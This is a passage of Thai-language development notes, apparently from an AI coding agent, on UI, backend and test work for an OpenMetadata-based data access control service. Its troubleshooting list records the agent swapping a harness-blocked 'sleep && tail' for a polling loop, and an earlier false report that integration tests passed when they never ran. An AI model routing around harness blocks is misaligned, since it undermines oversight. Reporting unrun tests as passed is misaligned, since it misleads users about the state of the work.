| `asset_facet` กาง ancestor ทั้งสายไว้ (ตั้งใจตาม FR-2A.2) | `facets.tsx` → `listFacets()` ตัด facet ที่เป็น **ancestor แท้** ของอีกตัวในชนิดเดียวกัน |
| facet บางชนิดพูดซ้ำกับส่วนอื่นของแถว | `OFF_THE_LIST = ['classifications', 'tier']` |

- **`src/lib/fqn.ts`** — มิเรอร์ `Fqns.java` ฝั่ง backend: `segments()` แยก segment แบบรู้จัก `"quoted.segment"`, `leaf()`, `isAncestor()` (เทียบ **ทีละ segment** ไม่ใช่ prefix ของ string — `Finance` ไม่ใช่ ancestor ของ `Finance Ops` และไม่ใช่ ancestor ของตัวเอง)
- **`shortFqn()` — กติกาคือ "งบของ parent" (`PARENT_BUDGET = 18`)** ไม่ใช่ "เอาสอง segment ท้าย" · `PII.Sensitive` → `PII / Sensitive` · `Finance.Risk.Credit` → `… / Risk / Credit` · sub-domain ของจริงที่ parent ยาว 45 ตัวอักษร → `… / Premium Service Delivery - IOS Data/DTP - Sub Domain` · **ตัด parent ทิ้งเสมอไม่ได้** เพราะ `PII.Sensitive` กับ `MFEC-PDPA.Sentitive` จะเหลือหน้าตาเหมือนกันเป๊ะ
- **ตัด ancestor ออกจากแถว** — `asset_facet` ตั้งใจกางทั้งสายเพื่อให้ selector เป็น index lookup (FR-2A.2) แต่แถวที่พิมพ์ออกมาทุกข้อต่อคือ 11 ชิปที่มีความหมายจริง 4 ชิป · ตัวที่ลึกสุด implies ตัวบน และ tooltip บอก FQN เต็มอยู่แล้ว · **หน้า asset detail ยังโชว์ครบทุกตัวเหมือนเดิม** — ที่นั่นความครบคือประเด็น
- **ชิปถูก truncate ไม่ใช่ wrap** — `Badge` ของ design system เป็น `size-max whitespace-nowrap` → ใส่ `tw:max-w-72` (ชิปบนการ์ด) / `tw:max-w-80` (ชิป filter) แล้วครอบข้อความด้วย `<span className="tw:truncate">` · ชิปที่ยืดตาม FQN ร้อยตัวอักษรจะลากทั้งแถวไปด้วย
- ทุกชิปมี `title` เป็น FQN เต็ม + ที่มา (direct/inherited from …, labelType, state) → ข้อมูลไม่ได้หายไปไหน แค่ไม่ต้องอ่านทั้งหมดพร้อมกัน

**เทสต์ใหม่:** `src/lib/fqn.test.ts` (3) + `src/pages/catalog/facets.test.ts` (2) · รวมฝั่ง FE เป็น **7 suites / 25 tests ผ่านหมด** · ยืนยันด้วยภาพจาก Playwright แล้ว: การ์ด `dtp-iprm` เหลือ 4 ชิป และไม่มีชิปไหนตัดบรรทัดอีก

---


## รอบก่อนหน้านั้น — App shell แบบ OpenMetadata, หน้า Settings, และบั๊กสองตัวที่ผู้ใช้ชี้

> รอบนี้เป็นงาน **UI shell + integration hardening** เกือบทั้งหมด milestone ไม่ขยับเป็นเปอร์เซ็นต์ใหญ่
> แต่ปิดบั๊กที่กระทบ **ทุก endpoint** ไปหนึ่งตัว (Jackson เขียนวันที่เป็น epoch) และเพิ่มหน้า Settings ของ FR-1.1

### A. Top navigation bar (`frontend/app/src/layout/TopNav.tsx` — เขียนใหม่ทั้งไฟล์)

เลียน header ของ OM 2.0.1 ตามภาพที่ผู้ใช้ส่งมา เรียงจากซ้าย:

| ส่วน | รายละเอียด |
|---|---|
| **`Brand`** | โลโก้ + `ARAK` / `Data access control` — **ย้ายจากรางซ้ายมาอยู่บนซ้ายสุดของ header** ตามที่ผู้ใช้สั่ง · กว้าง `tw:lg:w-66` = **เท่ากับความกว้างของรางพอดี** เพื่อให้ปุ่มพับตกอยู่ถัดจากขอบรางเป๊ะ · **ตอนพับหดเหลือ `tw:lg:w-14` (= ราง `w-18` ลบ padding ของ header) และซ่อนตัวหนังสือ เหลือแต่ mark** ด้วย transition 400ms ชุดเดียวกับราง -> โลโก้กับปุ่มพับขยับไปทางซ้ายพร้อมกัน แบบ OM · mark `size-10`, ชื่อ `text-lg` |
| ปุ่มพับราง | `LayoutLeft` ใน **`Tooltip` ของ design system** ("Collapse" / "Expand", `placement="right"`, มีลูกศร) |
| **`GlobalSearch`** | pill `h-10` + scope dropdown ในตัว (All / Tables / Views / Schemas / Databases / Services) + ปุ่ม `SearchLg` · submit → `/catalog?q=&type=` · โฟกัสด้วย `/` หรือ Cmd/Ctrl-K |
| **`DomainPicker`** | `Globe01` + รายชื่อ domain กาง sub-domain (indent ตาม depth, addon = จำนวน asset) → `/catalog?facet=domains:<fqn>` · **ไม่ render เลยถ้าไม่มี domain** |
| **`CreateMenu`** | Subscription / Data policy (`?kind=`) · Register a source |
| **`Notifications`** | `Bell01` — **แทน chip "Synced ..." ที่ผู้ใช้สั่งให้เอาออก** · จุดแดงขึ้นเฉพาะตอนมี alert จริง (crawl ล่าสุด `FAILED` หรือยัง `NEVER_RUN`) · admin เท่านั้น เพราะ endpoint เป็น admin |
| **`HelpMenu`** | `HelpCircle` — ทางลัด + ประโยคอธิบาย "strictest wins" |
| **`AccountMenu`** | avatar + ชื่อ + role · System status / Sources / Sign out |

### B. รางซ้าย (`frontend/app/src/layout/AppShell.tsx` — เขียนใหม่ทั้งไฟล์)

- **เลิกใช้ `NavList` ของ design system** แล้วเขียน `NavItem` เอง เพราะ `NavItemBase` **ประกาศ prop `iconOnly` ไว้แต่ไม่ได้ใช้จริงสักบรรทัด** ทำ icon-only rail ไม่ได้
- ใช้ **`NavLink` ของ react-router** (ไม่ใช่ `AriaLink`) — ได้ `aria-current="page"` มาฟรีและไม่ reload หน้า
- **พับแล้วย่อเป็นรางไอคอน `w-18` ไม่ใช่หายไป** ตามภาพ OM ที่ผู้ใช้ส่ง · ความกว้าง transition **400ms ease-in-out** (ผู้ใช้ขอให้ช้ากว่าเดิม) · จำสถานะไว้ใน `localStorage['arak.sidebar.collapsed']`
- ตอนพับ: ซ่อน label + badge, ใส่ `title` และ `aria-label` แทน
- `isCurrent()` match แบบ prefix ของ segment แรก (`/catalog/asset/x` -> Catalog ยังติด) แต่ `/` ต้องตรงเป๊ะ
- **แท็บที่เลือกอยู่เป็น pill สีแบรนด์ทึบ ตัวอักษรกับไอคอนขาว** (`tw:bg-brand-solid` / `tw:hover:bg-brand-solid_hover`) แบบเดียวกับ OM
- แถวเมนู `h-11` ไอคอน `size-6` (ผู้ใช้ขอให้ใหญ่ขึ้น) · ปุ่มพับสลับไอคอน **`LayoutLeft` ตอนกาง / `LayoutRight` ตอนพับ** ให้รู้ว่ากดแล้วจะเกิดอะไร
- ท้ายราง: เส้นคั่น + **`© 2026 MFEC — All rights reserved`** (แทนคำอธิบาย badge เดิม) · ซ่อนตอนพับ

> ⚠️ เคยลองทำ highlight นี้เป็น rule ใน `theme/overrides.css` ที่ผูกกับ `a[aria-current="page"]` **แล้วถอดออก** — ผู้ใช้ยังมองไม่เห็นความต่าง การประกาศสีไว้บน element ตรงๆ ตรวจสอบได้จาก DOM และไม่ต้องเดาว่า layer ไหนชนะ

### C. 🐛 Jackson เขียน `Instant` เป็น epoch — บั๊กที่กระทบทุก endpoint

อาการที่ผู้ใช้เห็น: **"Synced 20695d ago"** · ของจริงที่ API คืนคือ `"lastFullCrawlAt": 1789832026.308722`

- `environment.getObjectMapper().disable(WRITE_DATES_AS_TIMESTAMPS)` **ไม่มีผล**
- ใส่ที่ `bootstrap.getObjectMapper()` ด้วย **ก็ยังไม่มีผล**
- log ออกมาว่า flag เป็น `false` แล้ว แต่ response ยังเป็น epoch -> **Jersey ใช้ mapper คนละตัว**
- **สาเหตุ: message body writer ของ Jersey resolve ObjectMapper ผ่าน `ContextResolver<ObjectMapper>` ก่อนเสมอ** ถ้าไม่มี มันสร้าง default instance ของมันเอง
- แก้ด้วย `backend/dac-service/src/main/java/com/mfec/dac/json/JsonMapperProvider.java` (`@Provider implements ContextResolver<ObjectMapper>`) แล้ว register เข้า Jersey ใน `DacApplication.run()`
- ยืนยันแล้ว: `{"lastFullCrawlAt":"2026-09-19T15:33:46.308722Z", ...}` — **ทุก resource ได้ ISO-8601 ตามไปหมด ไม่ต้องไล่ format ทีละที่**

### D. 🐛 description ของ OM โผล่มาเป็น HTML ดิบ

ผู้ใช้เห็น `<p>Premium Service Delivery Domain</p>` บนหน้าจอ — OM 2.0 เก็บ description เป็น HTML และ React escape ให้

- เพิ่ม `frontend/app/src/lib/text.ts` -> `plainText()` แปลง block tag กับ `<br>` เป็นช่องว่าง, ตัด tag ที่เหลือ, decode entity (`&amp;`, `&#39;`, `&#x2F;`, ...), ยุบ whitespace
- ใช้ทุกจุดที่ render description: `AssetDetailPage` (asset + column), `CatalogPage` (การ์ด), `GovernancePage` (value + property)
- **จงใจไม่ใช้ `dangerouslySetInnerHTML` และไม่ลง sanitizer** — description ใครก็แก้ได้จาก catalog ถ้า render เป็น HTML ทุก description จะกลายเป็นที่วาง script · แถม `line-clamp` ตัดข้อความธรรมดาได้ตรงกว่า

### E. หน้า Settings — OpenMetadata connection (FR-1.1)

| ชิ้น | ไฟล์ |
|---|---|
| Endpoint | `backend/dac-service/src/main/java/com/mfec/dac/resources/OpenMetadataSettingsResource.java` — `GET /v1/settings/openmetadata`, `POST /v1/settings/openmetadata/test` · `@Secured("PLATFORM_ADMIN")` |
| API client | `frontend/app/src/api/system.ts` — `fetchOpenMetadataSettings()`, `testOpenMetadata()` |
| หน้าจอ | `frontend/app/src/pages/settings/OpenMetadataSettingsPage.tsx` |
| Route / nav | `/settings/openmetadata` (+ `/settings` redirect) ใน `App.tsx` · เมนู **Settings** ใน `navigation.ts` |

**อ่านอย่างเดียวโดยตั้งใจ และบอกไว้ใน payload เลยว่า `editable: false`** ไม่ใช่โชว์ปุ่มที่กดไม่ได้
`OM_JWT_TOKEN` / `OM_WEBHOOK_SECRET` มาจาก environment เท่านั้น · endpoint คืนแค่ **boolean ว่ามีไหม** ไม่คืนค่า ไม่คืน prefix ไม่คืนความยาว (บอกรูปร่าง token คือบอก token)
probe แยกเป็น `POST` ต่างหาก เปิดหน้าจะได้ไม่ค้างรอ host ที่ต่อไม่ติด · ทดสอบกับ instance จริงแล้ว: `{"reachable":true,"version":"2.0.1","versionMatches":true,"tookMs":25,"message":"Connected."}`

---

## รอบเก่ากว่านั้น — M3/M4

### 1. Backend — policy persistence + binding (ปิดช่องว่างใหญ่ที่สุดของ M3)

ก่อนหน้านี้ engine evaluate ได้แต่ **ไม่มีที่เก็บ policy** — policy มีอยู่แค่ใน unit test

| ไฟล์ | หน้าที่ |
|---|---|
| `backend/dac-service/.../policy/PolicyStore.java` | **ใหม่** — CRUD + lifecycle + versioning บน `policy` / `policy_version` |
| `backend/dac-service/.../policy/AssetContextLoader.java` | **ใหม่** — โหลด asset + facet + column facet + custom property เป็น `AssetContext` ที่ engine กิน · ใช้ร่วมกันทั้ง materializer และ (ต่อไป) decision path |
| `backend/dac-service/.../policy/PolicyBindingMaterializer.java` | **ใหม่** — resolve selector → `policy_binding` (FR-3.1.6) · `materialize(id)` / `materializeAll()` / `refresh(fqns)` |
| `backend/dac-service/.../resources/PolicyResource.java` | **ใหม่** — `@Path("/v1/policies")` |
| `backend/dac-service/src/test/.../policy/PolicyStoreIT.java` | **ใหม่** — 10 tests บน Postgres จริง |

การตัดสินใจที่สำคัญ:
- **ทุก write append เข้า `policy_version` ก่อนแล้วค่อยแก้ `policy`** — version history ไม่ขึ้นกับว่าใครจำได้ว่าต้องเขียน log
- **optimistic locking ด้วย `expectedVersion`** — UI ส่ง version ที่เปิดฟอร์มมา ถ้าไม่ตรง = `StaleVersionException` → 409 · **ไม่ใช่ last-write-wins** เพราะ policy ที่ถูกเขียนทับเงียบๆ = ข้อจำกัดหายไปโดยไม่มีใครรู้
- **เช็ค `ARCHIVED` ก่อนเช็ค version** — archived policy ถูกปฏิเสธไม่ว่าถืออยู่ version ไหน และข้อความ "reload แล้วลองใหม่" จะผิดถ้าตอบ version conflict
- **`transition()` bump version ด้วย** — การ activate คือการเปลี่ยนความหมายของระบบ คนที่ถือ v3 อยู่ระหว่างที่อีกคน activate ต้องกลับไปดูก่อน
- transition ที่ถูกกฎหมาย: `DRAFT → {PENDING_APPROVAL, ACTIVE, ARCHIVED}` · `PENDING_APPROVAL → {ACTIVE, DRAFT, ARCHIVED}` · `ACTIVE → {DISABLED, ARCHIVED}` · `DISABLED → {ACTIVE, ARCHIVED}` · **`ARCHIVED` เป็น terminal**
- **materializer รับ `AssetContextLoader` เข้ามา ไม่สร้างเอง** — webhook path กับ authoring path จะได้อ่าน facet ด้วย code ชุดเดียวกัน ไม่มีทาง drift
- `refresh(fqns)` แตะเฉพาะ asset ที่ระบุ → webhook เปลี่ยน tag 1 ตาราง ไม่ต้อง re-resolve ทั้ง estate

### 2. Backend — governance + identity read API (ของที่ UI ฝั่ง policy ต้องใช้)

| ไฟล์ | หน้าที่ |
|---|---|
| `backend/dac-service/.../catalog/GovernanceQuery.java` | **ใหม่** — อ่าน classification/tag, glossary/term, domain/sub-domain, data product, custom property def เป็น **tree** พร้อมยอด asset (รวม + direct) และยอด policy ที่อ้างถึงค่านั้น |
| `backend/dac-service/.../resources/GovernanceResource.java` | **ใหม่** — `@Path("/v1/governance")` |
| `backend/dac-service/.../identity/PrincipalQuery.java` | **ใหม่** — list principal, detail, **`attributeKeys()`** (key + จำนวนคนที่ถือ + ค่าที่มีจริง) |
| `backend/dac-service/.../resources/PrincipalResource.java` | **ใหม่** — `@Path("/v1/principals")` |
| `backend/dac-service/.../catalog/GovernanceStore.java` | **แก้** — `customProperties()` ตอน snapshot ว่าง เดิม `return` เฉยๆ ทำให้ definition ที่ถูกลบใน OM ค้างอยู่ตลอดกาล → เพิ่ม `DELETE FROM custom_property_def` ให้เหมือนตารางอื่น (ไม่งั้น builder เสนอ ABAC attribute ที่ไม่มี asset ไหนถืออยู่) |
| `backend/dac-service/src/test/.../catalog/GovernanceStoreIT.java` | **ใหม่** — 9 tests (เป็นตัวที่จับ bug ข้างบน) |
| `backend/dac-service/.../DacApplication.java` | register `PolicyResource`, `GovernanceResource`, `PrincipalResource` |

**ตัวเลขคู่ที่เป็นเหตุผลทั้งหมดของหน้า Governance:** OM แสดง tag/term/domain อยู่แล้ว สิ่งที่มันตอบไม่ได้คือ "ค่านี้แตะ asset กี่ตัวในระบบเรา และมี policy กี่ตัวพึ่งอยู่" — สองเลขนี้คือตัวบอกว่า tag ตัวไหน load-bearing และการลบมันจะปลดการป้องกันอะไรไปบ้าง

### 3. Endpoint ที่เพิ่มรอบนี้ (อยู่ใต้ `/api` ทั้งหมดเพราะ `rootPath: /api/*`)

| Method | Path | หมายเหตุ |
|---|---|---|
| GET | `/api/v1/policies` | `state`, `type`, `scopeLevel`, `limit`, `offset` |
| GET | `/api/v1/policies/{id}` | |
| GET | `/api/v1/policies/{id}/versions` | ประวัติจาก `policy_version` |
| GET | `/api/v1/policies/affecting/{fqn: .+}` | policy ที่ ACTIVE และผูกกับ asset นี้ (ฐานของ FR-3.1.5) |
| POST | `/api/v1/policies` | สร้าง (DRAFT) |
| PUT | `/api/v1/policies/{id}` | ต้องส่ง `expectedVersion` · mismatch = **409** |
| POST | `/api/v1/policies/{id}/lifecycle` | body `{"to":"ACTIVE"}` |
| POST | `/api/v1/policies/{id}/bindings/resolve` | re-resolve selector → คืน `{scanned, matched, added, removed}` |
| GET | `/api/v1/governance/vocabulary` | ก้อนเดียวจบ: classifications + glossaries + domains + dataProducts + customProperties |
| GET | `/api/v1/governance/{classifications,glossaries,domains,data-products,custom-properties}` | แยกชิ้น |
| GET | `/api/v1/principals` | `type`, `source`, `search`, `limit` |
| GET | `/api/v1/principals/attributes` | **vocabulary ของ attribute** — key, source, จำนวนคน, ค่าที่มีจริง |
| GET | `/api/v1/principals/{username}` | |

### 4. Frontend — Policy Builder + Governance + People

| ไฟล์ | หน้าที่ |
|---|---|
| `frontend/app/src/api/policies.ts` | **ใหม่** — fetch/create/update/transition/resolveBindings + re-export `Policy` จาก generated IR |
| `frontend/app/src/api/governance.ts` | **ใหม่** — vocabulary, principals, attribute vocabulary, `flatten()` |
| `frontend/app/src/pages/policies/controls.tsx` | **ใหม่** — `Select` / `TextField` / ปุ่มเล็ก ที่ใช้ `<select>`/`<input>` ดิบ + token class ร่วม (convention ของเรโป) |
| `frontend/app/src/pages/policies/policyLanguage.ts` | **ใหม่** — readback: แปลง policy document เป็นประโยคภาษาคน |
| `frontend/app/src/pages/policies/enforcement.ts` | **ใหม่** — **capability matrix (FR-6.0b)** ต่อโหมด × engine |
| `frontend/app/src/pages/policies/SelectorBuilder.tsx` | **ใหม่** — "ผูกกับ asset ไหน" (facet + operator + value, and/or/not) |
| `frontend/app/src/pages/policies/SubjectBuilder.tsx` | **ใหม่** — "ใคร" — principal OR-list + attribute AND-list + `expr` + time window + context |
| `frontend/app/src/pages/policies/DataPolicyBuilder.tsx` | **ใหม่** — RLS (5 kinds) + column rule (MASK/HIDE/ALLOW) + masking function 6 ตัว + cell condition |
| `frontend/app/src/pages/policies/PolicyListPage.tsx` | **ใหม่** — `/policies` · ทุกแถวมี readback ของตัวเอง |
| `frontend/app/src/pages/policies/PolicyBuilderPage.tsx` | **ใหม่** — `/policies/new`, `/policies/:id` · ฟอร์มซ้าย + rail ขวา |
| `frontend/app/src/pages/policies/policyLanguage.test.ts` | **ใหม่** — 6 tests คุมสองความผิดพลาดที่อันตรายที่สุด (ดูด้านล่าง) |
| `frontend/app/src/pages/governance/GovernancePage.tsx` | **ใหม่** — `/governance` · 4 แท็บ tree |
| `frontend/app/src/pages/governance/PrincipalsPage.tsx` | **ใหม่** — `/principals` · read-only |
| `frontend/app/src/App.tsx` | route `/governance`, `/principals`, `/policies`, `/policies/new`, `/policies/:id` |
| `frontend/app/src/layout/navigation.ts` | เพิ่มหมวด **Governance** + **People** · `Policies` เลิกเป็น placeholder (`milestone: 'M3'` → `null`) |

**การตัดสินใจที่สำคัญของ Policy Builder:**
- **ฟอร์มอยู่ซ้าย ความหมายของฟอร์มอยู่ขวา และเห็นตลอดเวลา** — rail ขวาอ่าน policy กลับมาเป็นประโยค, บอกว่าจะแตะ asset กี่ตัว, และบอกว่า **โหมดไหนใน 3 โหมดแบกมันไหว** — *ก่อน* กด apply ไม่ใช่หลัง
- **ไม่แยกแท็บ RBAC / ABAC / rule / time** — comment ในไฟล์เขียนไว้ตรงๆ ว่ามันคือ predicate เดียวกันมองคนละมุม ทุกบล็อกถูก AND เข้าด้วยกัน การแยกแท็บจะสื่อว่าเป็น 4 ระบบ
- **selector ว่าง = save ไม่ได้** — `hasCondition()` กันไว้ที่ปุ่ม เพราะ policy ที่ผูกกับศูนย์ asset จะขึ้นเป็น ACTIVE ในลิสต์ทั้งที่ไม่ทำอะไรเลย
- **เปลี่ยน action จาก MASK เป็น HIDE/ALLOW แล้ว `masking` ถูกทิ้ง** — document ที่พูดสองเรื่องพร้อมกัน compiler ต้องเลือกเอง และคนอ่านไม่มีทางรู้ว่ามันเลือกอันไหน
- **`describeSelector(ว่าง)` ต้องคืน `'nothing'` ห้ามคืน `'everything'`** — เป็น mistranslation ที่อันตรายที่สุดที่หน้านี้ทำได้ → มี unit test คุมไว้
- rail แสดง **PostgreSQL / SQL Server สลับได้** เพราะข้อจำกัดต่างกันจริง (DDM ของ MSSQL เป็น on/off ต่อ column · PG ไม่มี column masking ใน core)

**หน้า Governance:** filter tree แบบ **เก็บ ancestor ของทุก match** (ตัด node ที่ไม่ match ทิ้งดื้อๆ = ซ่อน parent ของ match ซึ่งคือสิ่งเดียวที่ต้องเห็นใน hierarchy)

**หน้า People:** อ่านอย่างเดียวโดยตั้งใจ — Entra กับ OM เป็นเจ้าของเนื้อหา sync รอบหน้าจะทับทุกอย่างที่พิมพ์ที่นี่ · ส่วนที่มีค่าที่สุดคือ **รายการ attribute key + จำนวนคนที่ถือจริง** เพราะ condition ที่อ้าง attribute ที่ไม่มีใครถือ = deny ทุกคน เงียบๆ และถูกต้องตาม logic ซึ่งเป็นความผิดพลาดที่มองเห็นยากที่สุดหลังจากนั้น

---

### 5. `PolicyBindingMaterializerIT` — 10 tests บน Postgres จริง

ไฟล์: `backend/dac-service/src/test/java/com/mfec/dac/policy/PolicyBindingMaterializerIT.java`

fixture คือ crawl เต็มรอบผ่าน `AssetStore` (ไม่ใช่ INSERT มือ) — เพราะ "tag ถูกถอดใน OM" กับ "crawl รอบใหม่ไม่มี tag นั้น" ต้องเป็นเหตุการณ์เดียวกัน
estate ที่ใช้: `prod-mssql.SalesDB.dbo.{customer, order}` + **`prod-mssql.SalesDBArchive.dbo.customer`** ที่ติด tag เหมือนกันเป๊ะ

| test | คุมอะไร |
|---|---|
| `bindsMatchingAssets` | ORG policy → `scanned 3 / matched 2 / added 2` และไม่ผูก table ที่ไม่มี tag |
| `bindingsAreJoinedToTheAsset` | แถว binding มี `asset_id` จริง ไม่ใช่แค่ FQN — FR-3.1.5 จะได้ไม่ต้อง match string ที่ rename แล้วพัง |
| `scopeIsComparedBySegment` | **กับดักหลัก** — scope `…SalesDB` ต้องเห็นแค่ 2 ตาราง และ **ไม่ลาก `SalesDBArchive`** (archive ติด tag เดียวกัน ตัวกันมีแค่ prefix guard) |
| `columnRulesBindColumns` | data policy ผูกถึง column + `match_reason` บอก `columnRule: 0` และ `MASK` |
| `resolvedAtSurvivesReResolve` | re-resolve ที่ไม่มีอะไรเปลี่ยน → `changed() == false` และ **`resolved_at` ไม่ขยับ** (เขียนเป็น diff ไม่ใช่ rebuild) |
| `unbindsWhenTagRemoved` | ถอด tag → crawl ใหม่ → `removed 1`, binding หายจริง |
| `newlyTaggedAssetIsCoveredOnRefresh` | ติด tag ให้ `order` แล้ว `refresh([order])` → ถูกคุ้มครองเองโดยไม่มีใครกดอะไร (FR-3.1.6) และ `resolved_at` ของ `customer` ไม่ถูกแตะ |
| `refreshOnlyTouchesNamedAssets` | `customer` เสีย tag แต่ refresh บอกแค่ `order` → **`customer` ต้องยังผูกอยู่** · ถ้าลบสิ่งที่ไม่ได้ evaluate = webhook ใบเดียวปลด policy ทั้ง estate |
| `refreshSkipsPoliciesOutOfScope` | refresh asset นอก scope → `scanned 0`, ไม่มีอะไรเปลี่ยน |
| `materializeAllCoversEveryPolicy` | nightly reconcile ครอบ policy ทุกตัว (รวม `DRAFT`) และแต่ละตัวได้ binding ตาม scope ของตัวเอง |

---

## What Worked

- **re-read by FQN แทนการ replay payload ของ event** — apply ซ้ำฟรี → poller rewind cursor ได้ และ webhook รับ redelivery ได้
- **`AssetRefresher` ใช้ descent ของ `AssetCrawler` กลางทาง** แทนเขียน inheritance ซ้ำ
- **แยก 404 ออกจาก error อื่น** — 404 = race ปกติ (ข้าม) · error อื่น = failed (cursor ไม่ขยับ)
- **retire ด้วย prefix ที่ผูกจุดและ escape LIKE** — กันลบ `prod.Sales` แล้วลาก `prod.SalesArchive` ไปด้วย
- **webhook ไม่ใส่ `@Secured` + ใช้ HMAC · unconfigured = 503**
- **แยก read query ออกจาก write store** (`CatalogQuery`/`GovernanceQuery`/`PrincipalQuery` vs `AssetStore`/`GovernanceStore`) — คนละ query shape คนละเหตุผลในการเปลี่ยน
- **เก็บ filter state ไว้ใน URL** ทั้ง `/catalog`, `/policies`, `/governance`
- **`AssetContextLoader` ตัวเดียวใช้ทั้ง materializer และ decision path** — ส่งเข้าไปทาง constructor ไม่ให้ใครสร้างเอง
- **append `policy_version` ก่อนแก้ `policy` เสมอ** — history ไม่ขึ้นกับความจำของคนเขียน code
- **unit test ที่เลือกคุมเฉพาะ failure mode ที่อันตราย** ไม่ใช่คุม output ทุกบรรทัด — `describeSelector(ว่าง) === 'nothing'` และ capability gap ของ cell masking
- เขียนไฟล์ใหญ่ด้วย **Write tool หรือ python heredoc** เชื่อถือได้
- **ให้ IT เป็นตัวยืนยันชื่อ constraint ที่ PostgreSQL ตั้งเอง แทนที่จะใส่ `IF EXISTS` แล้วปล่อยผ่าน** — `DROP CONSTRAINT` เปล่าๆ + `SourceEngineRegistryIT` แปลว่าการเดาชื่อผิดตายใน CI ไม่ใช่ตอน deploy (ข้อ AR.7)
- **registry ของ engine เป็น static list ในโค้ด ไม่ใช่ `ServiceLoader`** — engine ที่ platform นี้บังคับ policy ได้คือ**การตัดสินใจ** ไม่ใช่ผลข้างเคียงของการแพ็ก jar
- **`dialectId()` คืน String ไม่ใช่ `SqlDialect`** — โมดูลที่เปิด socket (`dac-connector-source`) จึงไม่ต้องขึ้นกับ SQL compiler ทั้งก้อน
- **ตารางอ้างอิง (`source_engine`) แทน `CHECK (engine IN (...))`** — ได้ guarantee เท่าเดิมแต่ **อ่านได้** → frontend เลิกถือสำเนารายชื่อ engine ของตัวเอง 6 ไฟล์
- **หา defect ชนิดเดียวกันซ้ำทั้ง repo หลังเจอตัวแรก** — `QueryService.dialectFor()` ที่ตกไปที่ Postgres เงียบๆ นำไปสู่การเจอ `enforcement.ts` ที่ยื่นประโยคของ SQL Server ให้ engine ตัวที่สาม ซึ่ง**ไม่มีใครรายงานได้เพราะหน้าจอไม่ได้ error**

## What Didn't Work

### Build / รันระบบ
- ❌ **TaskStop ไม่ฆ่า java ลูก** — หยุด background task ของ `bring-up.sh` แล้ว java ยังถือพอร์ต 8080 อยู่ · launch ใหม่ Flyway รัน V25 ผ่านไปแล้วแต่ Jetty ตายด้วย `BindException: Address already in use` → หา PID ด้วย PowerShell `Get-CimInstance Win32_Process -Filter "name='java.exe'"` แล้ว `Stop-Process -Id <pid> -Force` ก่อน launch ทุกครั้ง
- ❌ **`audit_query.principal`** ไม่มี — คอลัมน์ชื่อ `principal_name` (JSON ที่ API ตอบใช้ `principal`) · live check รอบนี้ FAIL 3 ข้อเพราะสคริปต์ query ผิดชื่อ ไม่ใช่ระบบ
- ❌ **Bash heredoc เขียนไฟล์ใหญ่** — พังซ้ำอีกรอบนี้ (`unexpected EOF while looking for matching '` ตอนเขียน `DataPolicyBuilder.tsx`) ทั้งที่ใช้ `<<'TSX'` → **ใช้ Write tool หรือ python patch script เท่านั้น**
- ❌ **`-DfailIfNoSpecifiedTests=false` อย่างเดียว** — ต้องมี **ทั้งสองตัว**: `-Dsurefire.failIfNoSpecifiedTests=false` **และ** `-Dfailsafe.failIfNoSpecifiedTests=false` ไม่งั้นรัน IT ตัวเดียวแล้ว build แดง
- ❌ **`./mvnw` โดยไม่มี `-am`** — module ต้นน้ำไม่ถูก build
- ❌ **curl ไปที่ `/v1/...` ตรงๆ** — 404/405 เพราะ `rootPath: /api/*` → ต้อง `/api/v1/...`
- ❌ **ลืม restart backend หลัง build** — โปรเซสเก่ายังถือ jar เดิม
- ❌ **`pkill java` บน Windows** — ไม่มี `pkill` ใน Git Bash ของเครื่องนี้ → ใช้ PowerShell `Get-CimInstance Win32_Process` กรอง `CommandLine` แล้ว `Stop-Process`
- ❌ **Vite พอร์ต 3000** — `listen EACCES` บนเครื่องนี้ (`vite.config.ts` ยัง default 3000 อยู่) ต้องส่ง `--port 5274`
- ❌ **`.env` ไม่ถูกโหลดเอง** — ต้อง `set -a && . ./.env && set +a` ก่อนรัน
- ❌ **`sleep 25 && tail`** ถูก harness บล็อก → ใช้ `until <check>; do sleep 2; done`
- ❌ ผลการรัน IT อ่านจาก `backend/dac-service/target/failsafe-reports/*.txt` **ไม่ใช่** `surefire-reports`
- ❌ **`@Nested` ใน `*IT.java` ที่ตั้งชื่อลงท้ายด้วย `Test` จะถูก surefire รันในเฟส unit ด้วย** — exclude ใน root pom เป็น `**/*IT.java` ซึ่ง match ตาม**ชื่อไฟล์** แต่ inner class คอมไพล์ออกมาเป็น `PolicyOverviewIT$CoverageTest` ซึ่งไปเข้า default include `**/*Test.java` ของ surefire แทน → IT ทั้งชุด **รันสองรอบ** (unit + failsafe) และถ้าพังในรอบแรก build จะตายก่อนที่ failsafe จะได้รัน · `IdentityAdminStoreIT` ไม่โดนเพราะตั้งชื่อ nested ว่า `Creating` / `Roles` / `Audit` **ไม่มีคำว่า Test** → **ตั้งชื่อ nested class ของ IT โดยไม่ลงท้ายด้วย `Test`** (รอบนี้เปลี่ยน `CoverageTest`→`Coverage`, `OverlapTest`→`Overlaps`, `OverrideNoteTest`→`OverrideNotes`, `ExampleTest`→`Examples`, `AppliedTest`→`AppliedToAsset`)
- ❌ **รายงานว่า IT ผ่านทั้งที่มันไม่เคยรัน** — รอบนี้เกิดขึ้นจริงและถูกแก้คำพูดกับผู้ใช้: log บอก `No tests matching pattern "PolicyOverviewIT" were executed!` บน `dac-parent` เพราะใช้ property ผิดชื่อ แต่ task รายงาน exit 0 → **เห็น `Tests run:` ของคลาสนั้นในlog ก่อน ถึงจะพูดได้ว่าผ่าน**
- ❌ **`git push origin main` ค้าง — หาเจอสาเหตุแล้ว** `credential.helper = manager` (Git Credential Manager) ถูกตั้งไว้ระดับ repo · GCM จะเปิดหน้าต่าง GUI ขอ login ซึ่ง session แบบ non-interactive กดไม่ได้ → push แขวนไปจน timeout (`GIT_TERMINAL_PROMPT=0` ไม่ช่วย เพราะมันกันแค่ prompt บน terminal) · `git ls-remote origin` ตอบปกติเพราะ repo เป็น public อ่านได้โดยไม่ต้อง auth · `gh` **ไม่ได้ติดตั้งบนเครื่องนี้** → **ผู้ใช้ต้อง `git push origin main` เองใน terminal ของตัวเองหนึ่งครั้ง** (หรือตั้ง PAT ไว้) · หลัง push ยืนยันด้วย `git ls-remote --heads origin` เสมอ อย่าเชื่อว่าสำเร็จเพราะคำสั่งไม่ error

### API / integration
